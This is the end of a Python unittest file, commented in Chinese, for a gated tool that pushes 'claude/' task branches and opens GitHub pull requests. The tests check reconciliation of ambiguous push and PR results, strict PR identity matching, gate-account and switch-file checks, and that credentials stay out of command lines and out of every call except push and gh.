        self.assertEqual((self.pushes(), self.row("push_branch")["state"]), (1, "done"))

    def test_unknown_push_that_never_landed_waits_for_owner_then_retried_once(self):
        """L3 第 3 轮 P1-10：结果不明、远端还是推之前的样子 → 核不清（分不清没推还是推了又被删），不自动重推；
        常浩核过结算成没做成，才重推一次。"""
        with self.push_then("hung_up"), self.assertRaises(P.Rejected):
            P.publish(self.tid)
        self.assertEqual((self.pushes(), self.row("push_branch")["state"]), (0, "unknown"))
        with self.assertRaises(P.Rejected):                # 对账：核不清，这张单冻结，不重推
            P.publish(self.tid)
        self.assertEqual((self.pushes(), self.row("push_branch")["state"]), (0, "unreconciled"))
        E.settle(self.row("push_branch")["key"], "failed", "常浩核过：远端从没有过这条分支", confirm=True)
        out = P.publish(self.tid)
        self.assertEqual((out["pushed"], self.pushes()), (True, 1))
        self.assertEqual(self.row("push_branch")["attempts"], 2)

    def test_definite_push_failure_is_retryable(self):
        real = P.git

        def offline(*a, **k):
            if a[0] == "push":
                return subprocess.CompletedProcess(a, 128, "", "fatal: unable to access: Could not resolve host: x")
            return real(*a, **k)
        with mock.patch.object(P, "git", side_effect=offline), self.assertRaisesRegex(P.Rejected, "确定没做成"):
            P.publish(self.tid)
        self.assertEqual(self.row("push_branch")["state"], "failed")
        self.assertTrue(P.publish(self.tid)["pushed"])

    def test_pr_create_error_is_unknown_and_never_reopened(self):
        real = subprocess.run

        def gh_create_fails_after_creating(cmd, *a, **k):
            r = real(cmd, *a, **k)
            if cmd[1:3] == ["pr", "create"]:
                return subprocess.CompletedProcess(cmd, 1, "", "HTTP 502")    # 其实 PR 已经开了
            return r
        with mock.patch.object(P.subprocess, "run", side_effect=gh_create_fails_after_creating), \
                self.assertRaisesRegex(P.Rejected, "分不清开没开"):
            P.publish(self.tid)
        self.assertEqual(self.row("open_pr")["state"], "unknown")
        head = self.handoff(self.tid)["head"]
        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(self.tid, head)]))   # GitHub 上其实有了
        with mock.patch.object(E, "TEST_GH", self.backend["gh"]):
            out = P.publish(self.tid)                      # 对账查到这条 PR：不再开
        self.assertEqual(out["pr_opened"], False)
        self.assertEqual(self.row("open_pr")["state"], "done")
        self.assertEqual(len([x for x in self.gh_calls() if x[:2] == ["pr", "create"]]), 1)

    def test_closed_gate_publishes_nothing(self):
        with mock.patch.object(R, "ensure_open", side_effect=E.Refused("恢复闸关着：电脑睡醒过，要先对账")):
            self.rejects(self.tid, "睡醒")
        self.assertEqual(self.gh_calls(), [])


class PrIdentity(PublishBase):
    """审查 P1-05：同名分支已有开着的 PR，核对目标、来源、分支、头提交都对才沿用。"""

    def test_existing_pr_is_reused_only_if_exactly_ours(self):
        tid = self.worked()
        P.publish(tid)
        head = self.handoff(tid)["head"]

        def forget_pr():                                                  # 出口账本记着「已开」会直接回原结果：每种情况从头核
            with E.db() as con:
                con.execute("DELETE FROM exits WHERE kind = 'open_pr'")
        for over in ({"isCrossRepository": True}, {"headRepositoryOwner": {"login": "fork-owner"}},
                     {"headRepository": {"name": "other"}}, {"baseRefName": "dev"}, {"headRefOid": "0" * 40},
                     {"headRefName": f"claude/{tid}-x"}):
            (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, head, **over)]))
            forget_pr()
            with self.assertRaises(P.Rejected) as c:
                P.publish(tid)
            self.assertIn("不沿用", str(c.exception))
        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, head)] * 2))
        forget_pr()
        with self.assertRaises(P.Rejected):
            P.publish(tid)                                                # 两个开着的也不认
        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, head)]))
        forget_pr()
        self.assertEqual(P.publish(tid)["pr"], "u8")


SWITCH_ON = {"enabled": True, "repos": ["dt-sandbox"], "proxy": None, "login": "shanhao1997", "at": None, "by": None}


class GateAndRealRemote(PublishBase):
    def test_only_dt_gate_account_may_publish(self):
        tid = self.worked()
        with mock.patch.object(P, "GATE_USER", "dt-gate"):
            self.rejects(tid, "只在 dt-gate 账号里跑")
            self.assertEqual(P.scan()[0]["check"], "可以发")                 # 只读的 scan 不受限

    def test_test_backend_must_be_a_local_bare_repo(self):
        """测试后端的远端不是 file:// 一律拒绝，开 PR 也不做（远端分支已经是这个头提交、不用推时同样）。"""
        tid = self.worked()
        git("fetch", "-q", str(self.wt(tid)), f"refs/heads/claude/{tid}:refs/heads/claude/{tid}", cwd=self.remote)  # 远端已有
        with mock.patch.object(P, "TEST_BACKEND", {**self.backend, "remote": "https://github.com/{github}.git"}):
            with self.assertRaises(P.Rejected) as c:
                P.publish(tid)
        self.assertIn("只能是本地裸仓库", str(c.exception))
        self.assertEqual(self.gh_calls(), [])
        self.assertEqual(P.remote_url("o/x"), self.backend["remote"].format(github="o/x"))
        with mock.patch.object(P, "TEST_BACKEND", None):
            self.assertEqual((P.remote_url("o/x"), P.gh_cmd()), ("https://github.com/o/x.git", GG.GH))

    def test_switch_off_refuses_real_path(self):
        """0E-4：真发布看 root 写的开关文件，没有文件就不发（合并代码不等于放开）；环境变量不算数。"""
        tid = self.worked()
        env = {"DT_PUBLISH_REMOTE": self.backend["remote"], "DT_GH": self.backend["gh"]}   # 环境变量不算数
        with mock.patch.object(P, "TEST_BACKEND", None), mock.patch.object(GG, "SWITCH", str(self.root / "no.json")), \
                mock.patch.dict(os.environ, env), mock.patch.object(GG, "ready") as ready:
            self.rejects(tid, "真发布开关关着")
        ready.assert_not_called()
        self.assertEqual(self.gh_calls(), [])

    def test_real_path_without_credentials_refuses_before_touching_remote(self):
        """真路径（0E-4）：开关开着但没放令牌 → 不发；开关没放开这个仓库 → 不发。都在联网之前（不取远端、不推、不开 PR）。"""
        tid = self.worked()
        home = self.root / "gatehome"
        home.mkdir()
        with mock.patch.object(P, "TEST_BACKEND", None), mock.patch.object(GG, "home", return_value=home), \
                mock.patch.object(GG, "read_switch", return_value=SWITCH_ON), \
                mock.patch.object(G, "allowed_repos", return_value={"dt-sandbox": "o/dt-sandbox"}), \
                mock.patch.object(P, "ensure_mirror") as mirror:
            self.rejects(tid, "put-publish-token")
            with mock.patch.object(GG, "read_switch", return_value={**SWITCH_ON, "repos": ["other"]}):
                self.rejects(tid, "没有放开 dt-sandbox")
        mirror.assert_not_called()
        self.assertEqual(self.gh_calls(), [])
        self.assertFalse((self.root / "mirrors").exists())

    def test_real_path_uses_minimal_env_and_keeps_token_off_command_lines(self):
        """真路径：git、gh 全部拿 gate_github 的最小环境（没有代理、PATH 固定），令牌只给推送和 gh，取包、核历史、
        取 main、查远端分支都不带；令牌不出现在任何命令行参数里。远端、gh 换成本地的（真 GitHub 不在测试里碰）。"""
        tid = self.worked()
        home = self.root / "gatehome"
        home.mkdir()
        gh = self.root / "ghbin/gh-real"                     # 最小环境里没有 FAKE_GH_STATE：状态目录写死在包装脚本里
        gh.write_text(f'#!/bin/sh\nFAKE_GH_STATE="{self.gh_state}" exec "{sys.executable}" -B "{fake_gh.__file__}" "$@"\n')
        gh.chmod(0o755)
        token = "ghp_" + "Z9y8X7w6V5" * 3 + "u4T3s2"
        seen, real_run = [], subprocess.run

        def spy(cmd, *a, **kw):
            if isinstance(cmd, list) and cmd and cmd[0] in ("git", str(gh)):
                seen.append((list(cmd), kw.get("env")))
            return real_run(cmd, *a, **kw)

        with mock.patch.object(P, "TEST_BACKEND", None), mock.patch.object(GG, "home", return_value=home), \
                mock.patch.object(P, "remote_url", side_effect=lambda g: self.backend["remote"].format(github=g)), \
                mock.patch.object(P, "gh_cmd", return_value=str(gh)), \
                mock.patch.object(GG, "read_switch", return_value=SWITCH_ON), \
                mock.patch.object(GG, "ready", side_effect=lambda repo, github: (GG.env(), GG.env(token))) as ready, \
                mock.patch.object(P.subprocess, "run", side_effect=spy):
            out = P.publish(tid)
        ready.assert_called_once_with("dt-sandbox", "o/dt-sandbox")
        self.assertEqual((out["pushed"], out["pr_opened"]), (True, True))
        self.assertEqual(self.remote_branch(tid), self.handoff(tid)["head"])
        self.assertTrue(seen)
        authed = []
        for cmd, env in seen:
            with self.subTest(cmd=cmd[:4]):
                self.assertIsNotNone(env, "真路径不许继承调用方环境")
                self.assertEqual(env["PATH"], GG.SAFE_PATH)
                self.assertFalse([k for k in env if "proxy" in k.lower() or k.startswith("FAKE_")])
                self.assertFalse([x for x in cmd if token in x])
                if "GH_TOKEN" in env:
                    authed.append("gh" if cmd[0] == str(gh) else next(x for x in cmd if x in ("push", "fetch",
                                                                                                "ls-remote", "bundle")))
        self.assertEqual(authed, ["push", "gh", "gh"], "令牌只给推送和 gh（查 PR、开 PR）")
        self.assertTrue([c for c, e in seen if "ls-remote" in c and "GH_TOKEN" not in e])


def P_opt(args, name):
    return args[args.index(name) + 1] if name in args else None


if __name__ == "__main__":
    unittest.main()
